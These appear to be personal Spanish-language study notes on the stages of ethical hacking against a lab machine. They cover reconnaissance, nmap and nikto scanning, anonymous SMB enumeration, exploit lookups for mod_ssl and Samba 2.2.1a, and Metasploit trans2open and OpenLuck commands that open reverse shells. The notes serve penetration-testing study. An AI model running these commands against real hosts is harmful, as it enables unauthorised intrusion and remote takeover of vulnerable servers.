# The 5 Stages of Ethical Hacking ❮❯

## 1 Reconnaissance 
### Passive
**Physical** - > Location information: Satellite images, drone decon, building layouts (badge readers, break areas, security, fencing)
**Social** -> Job information: Employees (name, job tittle, phone number, manager...), Picutures (badge photos, desk photos, computer photos...)

**Web / Host** 
	**Target validation** -> WHOIS, nslookup, dnsrecon
	**Finding subdomains** -> Google Fu, dig, Nmap, Sublist3r, Bluto, crt.sh, etc...
	**Fingerprinting** -> Nmap, Wapalyzer, WhatWeb, BuiltWith, Netcat
	**Data Breaches** -> HaveIBeenPwned, Breach-Parse, WeLeakInfo

#### Discovering Email Addresses
- https://hunter.io/ Pagina Web para buscar los email addresses de las personas importantes de la company 
- https://phonebook.cz/ Pagina Web para email addresses, subdominios, domains y URLs free
- https://www.voilanorbert.com/ Encontrar emails, pero debes de instalar el pluggin

### Active
## 2 Scanning and Enumeration 

Nmap, Nessus, Nikto, etc...

### Scanning network
❯ **ifconfig** Para ver nuestra interface y nuestra IP
❯ **arp-scan -l** Para escanear la nuestra red y ver dispositivos estan conectados (l=ele)
❯ **arp-scan -I ens33 --localhost** Para escanear nuestra interface y ver los dispostivos de la red (I=i mayuscula)
❯ **netdiscover -r 192.168.68.0/24** Descubriremos las maquinas utilizando ARP (r=range)

### Scanning with Nmap
❯ **nmap --help** Nos muestra las opciones de Nmap
❯ **nmap -T4 -p- -A 192.168.68.112** Escanearemos los puertos (T4=velocidad, p=Todos los puertos, A=Version, SO, finger printing, etc... all) y agregamos la IP de la victima (T4 es para VH, HTB ya que no es detectado, pero va lento)

### Enumeration HTTP y HTTPS
- 80/443 - Apache - Default WebPage -  PHP Potencial ataque
- Error 404 - Information Disclosure - Cuando nos sale un error en un enlace y podemos adjuntar la captura de pantalla
❯ **nikto -h <IP.ADDRESS>** Asi podemos empezar el escaneo de vulnerabilidades web (h=host, IP.address=http://)
	Podemos hacer un archivo en donde podemos colocar el resultado de Nikto
❯ **dirbuster&** Para enumerar directorios, Asi abrimos la  interface del programa

### Enumerating SMB
 - **msfconsole** Para iniciar metaesploit
	❯ **search smb** En este caso buscaremos exploits de SMB, podemos encontrar:
		* Modulos: 'Auxiliary, Exploits, Post, Payload'
		* Tipo de Accion: 'Dos, Fuzzers, Scanner, Gather'
	
	❯ **use 60** Para usar el modulo, lo podremos hacer con la ruta o con el numero 
	❯ **info** Mirar la informacion del modulo
	❯ **options** Para ver las opciones del modulo y ver que necesitamos colocar para que funcione correctamente
	❯ **set RHOSTS 192.168.68.112** Colocamos la IP target en el modulo
	❯ **run** Para ejecutar el exploit

Nos muestra que en el purto 139 tenemos una version de Unix (Samba 2.2.1a)

O podemos usar el siguiente comando:

❯ **smbclient -L \\\\\\\\192.168.68.112\\\\** Tendremos acceso anonimo al SMB y le damos enter ya que no hay passwd, ahi descubrimos un usuario ADMIN$ e IPC$
❯ **smbclient \\\\\\\\192.168.68.112\\\\ADMIN$** Ahora colocamos el usuario y le damos enter, pero en esta ocasion si se necesita una passwd
❯ **smbclient \\\\\\\\192.168.68.112\\\\IPC$** Colocamos al segundo usuario y sin necesidad de passwd podemos ingresar al SMB
	❯ **help** Miramos la ayuda y los comandos que podemos ejecutar en el SMB 
	❯ **ls** Para listar lo que hay en servidor
	❯ **exit** Para salir del SMB

### Researching Potential Vulnerabilities
- 80/443 - Apache - Default WebPage -  PHP Potencial ataque
- Error 404 - Information Disclosure - Cuando nos sale un error en un enlace y podemos adjuntar la captura de pantalla
- Information Disclosure - 404 error - Salio de la pagina Web
- Information Disclosure - server headers disclose version information - Salio de la pagina Web
- mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow OSVDB-756 - Salio de Nikto
- SMB Samba - Unix Samba(samba 2.2.1a)
- Webalizer version 2.01 
- Open SSH 2.9p2

Buscamos en Google **mod_ssl/2.8.4 exploit (Puerto 80/443)** esto por la informacion que habiamos encontrado en el informe de Nikto
https://www.exploit-db.com/exploits/764
https://github.com/heltonWernik/OpenLuck

Buscaremos en Google para **Samba 2.2.1a (SMB Puerto 139)**
https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/ En donde te guia a usar Metasploit
https://www.exploit-db.com/exploits/7
https://www.exploit-db.com/exploits/10 Remote Code Execution

Tambien podemos usar 
❯ **searchsploit samba 2.2.1a** Para ver en la base de datos de Searchsploit que, pero en este caso debes de no ser tan especifico Samba 2
❯ **searchsploit mod ssl 2** Nos mostrara diferentes exploits de mod ssl 

## 3 Gaining Acees (Explotation)
Lo podemos hacer de dos formas, con Metasploit o de Forma Manual 
Forma Automatica
En este caso utilizaremos Metasploit para poder entrar 
❯ **msfconsole** 
	❯ **search trans2open**
	❯ **use 1**
	❯ **options**
	❯ **set RHOST 192.168.68.112**
	❯ **run o exploit**

Miramos en options que esta ejecutado un **staged payload** ya que tenemos un **linux/x86/meterpreter/reverse_tcp**
Si no funciona podriamos hacer lo siguiente y buscaremos un **Non-staged payload**
❯ **set payload linux/x86/** Antes de completar el payload, podemos darle doble TAB para ver las opciones y los demas Payloads
❯ **set payload linux/x86/shell_reverse_tcp** 
❯ **options** 
❯ **run** Ejecutamos  


Forma manual de hacernos Root
❯ **./open 0x6b 192.168.68.112 -c 40** Este nos ayudara a entrar por Apache en la version 1.3.20
* Primero corremos el exploit sin nada para ver las opciones y ahi ver que version de Apache tendremos que escoger (0x6b)
* IP -> Es la de la maquina victima 
* c -> Numero de conexiones entre 40 - 50

## 4 Maintaining Access

## 5 Covering Tracks
